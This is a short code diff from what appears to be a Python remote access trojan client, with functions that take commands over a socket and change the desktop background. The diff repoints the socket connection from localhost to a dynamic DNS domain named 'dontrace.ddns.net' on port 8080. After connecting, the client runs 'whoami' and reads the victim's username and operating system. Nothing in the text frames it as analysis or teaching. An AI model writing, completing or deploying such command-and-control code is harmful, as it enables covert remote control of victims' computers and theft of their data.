@@ -64,7 +64,9 @@ def change_desktop_bg(s,command):
         
 def connect():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('127.0.0.1', 8080))
+    rmdomain='dontrace.ddns.net'
+    rhost=socket.gethostbyname(rmdomain)
+    s.connect((rhost, 8080))
     os=str(platform.system())
     CMD =  subprocess.Popen('whoami', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     username=str(CMD.stdout.read().split('\\')[-1])
